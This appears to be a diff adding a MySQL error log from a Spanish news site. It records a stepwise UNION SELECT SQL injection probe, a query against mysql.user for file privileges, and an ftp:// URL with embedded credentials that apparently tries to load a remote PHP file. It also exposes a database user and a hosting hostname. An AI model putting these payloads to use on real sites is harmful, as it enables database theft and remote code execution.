@@ -1,0 +1,95 @@
+Time : 15:21:02
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '://premielo:premielo@www.premieloftet.no/envi.php?' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=ftp://premielo:premielo@www.premieloftet.no/envi.php?
+
+Time : 14:21:25
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '://premielo:premielo@www.premieloftet.no/envi.php?' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=ftp://premielo:premielo@www.premieloftet.no/envi.php?
+
+Time : 09:50:25
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=
+
+Time : 08:34:40
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '1.6877777777778E+28,7' at line 1
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'delicias' ORDER BY date DESC LIMIT 1.6877777777778E+28,7
+
+Time : 08:33:38
+SQLSTATE[42000]: Syntax error or access violation: 1142 SELECT command denied to user 'joseifb'@'ps447048.dreamhost.com' for table 'user'
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'delicias11111111111111111111111111' UNION SELECT CONCAT(CHAR(100,100,100),CHAR(91,88,93),file_priv,CHAR(91,88,88,93)),2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19 FROM mysql.user limit 0,1 -- /* order by 'as' ORDER BY date DESC LIMIT 161,7
+
+Time : 08:33:35
+SQLSTATE[21000]: Cardinality violation: 1222 The used SELECT statements have a different number of columns
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'delicias1111111111111' UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45),CHAR(45,120,55,45,81,45),CHAR(45,120,56,45,81,45),CHAR(45,120,57,45,81,45),CHAR(45,120,49,48,45,81,45),CHAR(45,120,49,49,45,81,45),CHAR(45,120,49,50,45,81,45),CHAR(45,120,49,51,45,81,45),CHAR(45,120,49,52,45,81,45),CHAR(45,120,49,53,45,81,45),CHAR(45,120,49,54,45,81,45),CHAR(45,120,49,55,45,81,45),CHAR(45,120,49,56,45,81,45) -- /* order by 'as /*' ORDER BY date DESC LIMIT 161,7
+
+Time : 08:33:34
+SQLSTATE[21000]: Cardinality violation: 1222 The used SELECT statements have a different number of columns
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'delicias1111111111111' UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45),CHAR(45,120,55,45,81,45),CHAR(45,120,56,45,81,45),CHAR(45,120,57,45,81,45),CHAR(45,120,49,48,45,81,45),CHAR(45,120,49,49,45,81,45),CHAR(45,120,49,50,45,81,45),CHAR(45,120,49,51,45,81,45),CHAR(45,120,49,52,45,81,45),CHAR(45,120,49,53,45,81,45),CHAR(45,120,49,54,45,81,45),CHAR(45,120,49,55,45,81,45) -- /* order by 'as /*' ORDER BY date DESC LIMIT 161,7
+
+Time : 08:33:34
+SQLSTATE[21000]: Cardinality violation: 1222 The used SELECT statements have a different number of columns
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'delicias1111111111111' UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45),CHAR(45,120,55,45,81,45),CHAR(45,120,56,45,81,45),CHAR(45,120,57,45,81,45),CHAR(45,120,49,48,45,81,45),CHAR(45,120,49,49,45,81,45),CHAR(45,120,49,50,45,81,45),CHAR(45,120,49,51,45,81,45),CHAR(45,120,49,52,45,81,45),CHAR(45,120,49,53,45,81,45),CHAR(45,120,49,54,45,81,45) -- /* order by 'as /*' ORDER BY date DESC LIMIT 161,7
+
+Time : 08:33:33
+SQLSTATE[21000]: Cardinality violation: 1222 The used SELECT statements have a different number of columns
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'delicias1111111111111' UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45),CHAR(45,120,55,45,81,45),CHAR(45,120,56,45,81,45),CHAR(45,120,57,45,81,45),CHAR(45,120,49,48,45,81,45),CHAR(45,120,49,49,45,81,45),CHAR(45,120,49,50,45,81,45),CHAR(45,120,49,51,45,81,45),CHAR(45,120,49,52,45,81,45),CHAR(45,120,49,53,45,81,45) -- /* order by 'as /*' ORDER BY date DESC LIMIT 161,7
+
+Time : 08:33:32
+SQLSTATE[21000]: Cardinality violation: 1222 The used SELECT statements have a different number of columns
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'delicias1111111111111' UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45),CHAR(45,120,55,45,81,45),CHAR(45,120,56,45,81,45),CHAR(45,120,57,45,81,45),CHAR(45,120,49,48,45,81,45),CHAR(45,120,49,49,45,81,45),CHAR(45,120,49,50,45,81,45),CHAR(45,120,49,51,45,81,45),CHAR(45,120,49,52,45,81,45) -- /* order by 'as /*' ORDER BY date DESC LIMIT 161,7
+
+Time : 08:33:32
+SQLSTATE[21000]: Cardinality violation: 1222 The used SELECT statements have a different number of columns
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'delicias1111111111111' UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45),CHAR(45,120,55,45,81,45),CHAR(45,120,56,45,81,45),CHAR(45,120,57,45,81,45),CHAR(45,120,49,48,45,81,45),CHAR(45,120,49,49,45,81,45),CHAR(45,120,49,50,45,81,45),CHAR(45,120,49,51,45,81,45) -- /* order by 'as /*' ORDER BY date DESC LIMIT 161,7
+
+Time : 08:33:31
+SQLSTATE[21000]: Cardinality violation: 1222 The used SELECT statements have a different number of columns
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'delicias1111111111111' UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45),CHAR(45,120,55,45,81,45),CHAR(45,120,56,45,81,45),CHAR(45,120,57,45,81,45),CHAR(45,120,49,48,45,81,45),CHAR(45,120,49,49,45,81,45),CHAR(45,120,49,50,45,81,45) -- /* order by 'as /*' ORDER BY date DESC LIMIT 161,7
+
+Time : 08:33:30
+SQLSTATE[21000]: Cardinality violation: 1222 The used SELECT statements have a different number of columns
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'delicias1111111111111' UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45),CHAR(45,120,55,45,81,45),CHAR(45,120,56,45,81,45),CHAR(45,120,57,45,81,45),CHAR(45,120,49,48,45,81,45),CHAR(45,120,49,49,45,81,45) -- /* order by 'as /*' ORDER BY date DESC LIMIT 161,7
+
+Time : 08:33:30
+SQLSTATE[21000]: Cardinality violation: 1222 The used SELECT statements have a different number of columns
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'delicias1111111111111' UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45),CHAR(45,120,55,45,81,45),CHAR(45,120,56,45,81,45),CHAR(45,120,57,45,81,45),CHAR(45,120,49,48,45,81,45) -- /* order by 'as /*' ORDER BY date DESC LIMIT 161,7
+
+Time : 08:33:29
+SQLSTATE[21000]: Cardinality violation: 1222 The used SELECT statements have a different number of columns
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'delicias1111111111111' UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45),CHAR(45,120,55,45,81,45),CHAR(45,120,56,45,81,45),CHAR(45,120,57,45,81,45) -- /* order by 'as /*' ORDER BY date DESC LIMIT 161,7
+
+Time : 08:33:28
+SQLSTATE[21000]: Cardinality violation: 1222 The used SELECT statements have a different number of columns
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'delicias1111111111111' UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45),CHAR(45,120,55,45,81,45),CHAR(45,120,56,45,81,45) -- /* order by 'as /*' ORDER BY date DESC LIMIT 161,7
+
+Time : 08:33:28
+SQLSTATE[21000]: Cardinality violation: 1222 The used SELECT statements have a different number of columns
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'delicias1111111111111' UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45),CHAR(45,120,55,45,81,45) -- /* order by 'as /*' ORDER BY date DESC LIMIT 161,7
+
+Time : 08:33:27
+SQLSTATE[21000]: Cardinality violation: 1222 The used SELECT statements have a different number of columns
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'delicias1111111111111' UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45) -- /* order by 'as /*' ORDER BY date DESC LIMIT 161,7
+
+Time : 08:33:26
+SQLSTATE[21000]: Cardinality violation: 1222 The used SELECT statements have a different number of columns
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'delicias1111111111111' UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45) -- /* order by 'as /*' ORDER BY date DESC LIMIT 161,7
+
+Time : 08:33:26
+SQLSTATE[21000]: Cardinality violation: 1222 The used SELECT statements have a different number of columns
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'delicias1111111111111' UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45) -- /* order by 'as /*' ORDER BY date DESC LIMIT 161,7
+
+Time : 08:33:25
+SQLSTATE[21000]: Cardinality violation: 1222 The used SELECT statements have a different number of columns
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'delicias1111111111111' UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45) -- /* order by 'as /*' ORDER BY date DESC LIMIT 161,7
+
+Time : 08:33:24
+SQLSTATE[21000]: Cardinality violation: 1222 The used SELECT statements have a different number of columns
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'delicias1111111111111' UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45) -- /* order by 'as /*' ORDER BY date DESC LIMIT 161,7
+
+Time : 08:33:24
+SQLSTATE[21000]: Cardinality violation: 1222 The used SELECT statements have a different number of columns
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'delicias1111111111111' UNION SELECT CHAR(45,120,49,45,81,45) -- /* order by 'as /*' ORDER BY date DESC LIMIT 161,7
+
+Time : 08:30:55
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''delicias'' ORDER BY date DESC LIMIT 161,7' at line 1
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'delicias'' ORDER BY date DESC LIMIT 161,7
